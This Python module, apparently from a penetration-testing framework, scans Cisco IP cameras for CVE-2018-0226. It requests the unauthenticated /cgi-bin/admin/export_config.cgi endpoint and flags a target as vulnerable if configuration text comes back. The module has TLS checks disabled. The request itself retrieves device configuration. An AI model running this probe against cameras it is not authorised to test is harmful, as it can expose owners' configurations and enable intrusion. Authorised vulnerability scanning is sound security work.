import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "cisco/config_bypass_scan"
        self.description = "Unauthenticated system configuration disclosure scanner for Cisco IP Cameras (CVE-2018-0226)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/cgi-bin/admin/export_config.cgi"
        else:
            url = f"{target.rstrip('/')}/cgi-bin/admin/export_config.cgi"
            
        try:
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                response = await client.get(url)
                # Si l'endpoint renvoie directement le binaire ou texte de configuration Cisco sans erreur 401
                if response.status_code == 200 and ("Cisco" in response.text or "syslog" in response.text.lower()):
                    return {
                        "vulnerable": True,
                        "details": "Cisco backup and configuration export script is completely exposed without authorization."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
